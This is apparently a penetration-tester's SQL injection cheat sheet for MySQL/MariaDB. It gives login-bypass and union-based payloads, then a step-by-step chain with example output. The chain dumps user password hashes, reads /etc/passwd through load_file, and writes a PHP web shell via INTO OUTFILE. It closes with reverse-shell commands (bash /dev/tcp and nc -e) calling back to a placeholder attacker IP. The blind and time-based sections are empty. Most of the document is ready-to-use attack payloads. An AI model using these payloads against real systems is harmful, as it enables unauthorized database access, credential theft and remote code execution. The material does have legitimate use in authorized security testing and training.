##################################################################################
=== MySQL (MariaDB) ===
https://dev.mysql.com/doc/

- ENTRY-POINT DETECTION -
URL-ENCODED     ASCII
-------------------------
%27             '
%22             "
%23             #
%3B             ;
%29             )
%2A             *
%26apos         &apos
-------------------------

- MULTIPLE ENCODING -
%27%27
%25%27

- ENCODED SPACES -
+
${IFS}
%20

- ERROR-BASED PAYLOADS -
Login bypass:
(start in second row, second column?)
' or 1=1 LIMIT 1,1 #

' or 1=1 #

Database enumeration:
(assumes we have information about the database such as table 'users', column 'password' etc..)
' or 1=1 in (SELECT * FROM users) #
' or 1=1 in (SELECT password FROM users) #
' or 1=1 in (SELECT password FROM users WHERE username='admin') #

- UNION-BASED PAYLOADS -
[1] (detect number of columns)
' OR 1=1 ORDER by 1 #
' OR 1=1 ORDER by 2 #
' OR 1=1 ORDER by 3 #
etc...

[2] (detect number of columns)
' OR 1=1 UNION SELECT null #
' OR 1=1 UNION SELECT null,null #
' OR 1=1 UNION SELECT null,null,null #
' UNION SELECT null #
' UNION SELECT null,null #
' UNION SELECT null,null,null #
etc...

(assumes we have detected 3 columns)
' OR 1=1 UNION SELECT 1,2,3 #
' OR 1=1 UNION SELECT 1,2,version() #
' OR 1=1 UNION SELECT 1,2,@@version #
' OR 1=1 UNION SELECT user(),database(),@@version #

(the following shows an example of a series of exploits leading up to a reverse shell)
---------------------------------------------------------------------------------------------------------
(detect schemas, tables, and columns (assumes we have detected the amount of columns) )
STEP 1.

CODE:
' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns #

EXAMPLE RESULT (from command above):
|-------------------|-------------------|-----------------|
|information_schema |ALL_PLUGINS        |PLUGIN_NAME      |
|information_schema |ALL_PLUGINS        |PLUGIN_VERSION   |
|information_schema |ALL_PLUGINS        |etc...           |
|performance_schema |cond_instances     |NAME             |
|performance_schema |cond_instances     |etc...           |
|webdb              |users              |id               |
|webdb              |users              |email            |
|webdb              |users              |username         |
|webdb              |users              |password         |
|webdb              |users              |IsAdmin          |
|webdb              |users              |etc...           |
|-------------------|-------------------|-----------------|

(exclude unwanted information from detected schemas, tables, and columns)
STEP 2.

CODE:
' UNION SELECT TABLE_SCHEMA, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA != "information_schema" AND TABLE_SCHEMA != "performance_schema" #

EXAMPLE RESULT (from command above):
|-------------------|-------------------|-----------------|
|webdb              |users              |id               |
|webdb              |users              |email            |
|webdb              |users              |username         |
|webdb              |users              |password         |
|webdb              |users              |IsAdmin          |
|webdb              |users              |etc...           |
|-------------------|-------------------|-----------------|

STEP 3.

CODE:
' UNION SELECT username,password,email FROM webdb.users #

EXAMPLE RESULT (from command above):
|-------------------|-------------------|-----------------|
|Id                 |Name               |Email            |
|-------------------|-------------------|-----------------|
|admin              |8bab434138ebcc...  |admin@localhost  |
|web                |fc7dfcadeec2bc...  |web@vulnwebapp   |
|john               |58c2bd8aef9928...  |john@vulnwebapp  |
|-------------------|-------------------|-----------------|

STEP 4 (optional if we want to get a reverse shell via MySQL "check for privs"). 
(using <' UNION SELECT user(),null,null #> we can determine that "web" is the MySQL user running the commands)

CODE:
' UNION SELECT File_priv,2,3 FROM mysql.user WHERE user="web" #

EXAMPLE RESULT (from code above):
("web" has File_priv 'Y' which means we can read files)
|-------------------|-------------------|-----------------|
|Id                 |Name               |Email            |
|-------------------|-------------------|-----------------|
|Y                  |2                  |3                |
|-------------------|-------------------|-----------------|

CODE:
' UNION SELECT @secure_file_priv,2,3 #

EXAMPLE RESULT (from code above):
(if no NULL is returned for @secure_file_priv it means "web" has file read/write outside of the database)
|---|---------|---------|
|Id |Name     |Email    |
|---|---------|---------|
|   |2        |3        |
|---|---------|---------|

STEP 5 (abuse the permissions to read files).

CODE:
' UNION SELECT load_file('/etc/passwd'),2,3 #

EXAMPLE RESULT (from code above):
|---------------------------------------|-------------------|-----------------|
|Id                                     |Name               |Email            |
|---------------------------------------|-------------------|-----------------|
|root:x:0:0::/root:/bin/bash            |2                  |3                | 
|bin:x:1:1::/:/usr/bin/nologin          |                   |                 |
|daemon:x:2:2::/:/usr/bin/nologin       |                   |                 |
|.                                      |                   |                 |
|.                                      |                   |                 |
|web:x:1000:1000::/home/web:/bin/bash   |                   |                 | 
|---------------------------------------|-------------------|-----------------|

STEP 6 (abuse the permissions to write files).

CODE:
' UNION SELECT "<?php passthru($_GET['cmd']); ?>",2,3 INTO OUTFILE '/var/www/html/WebApp/shell.php' #

STEP 7 (visit the URI for the shell).

http://<192.168.1.1>/<WebApp>/shell.php?cmd=id
uid=33(www-data)gid=33(www-data)groups=33(www-data)2 3

http://<192.168.1.1>/<WebApp>/shell.php?cmd=bash%20-c%20'bash%20-i%20>&%20/dev/tcp/<attacker_ip>/<port> 0>&1'
http://<192.168.1.1>/<WebApp>/shell.php?cmd=nc%20-e%20/bin/bash%20<attacker_ip>%20<port>
...
---------------------------------------------------------------------------------------------------------


- BLIND-BASED PAYLOADS -
.
.

- TIME-BASED PAYLOADS -
.
.

##################################################################################
=== other database technology ===
.
.
.
##################################################################################
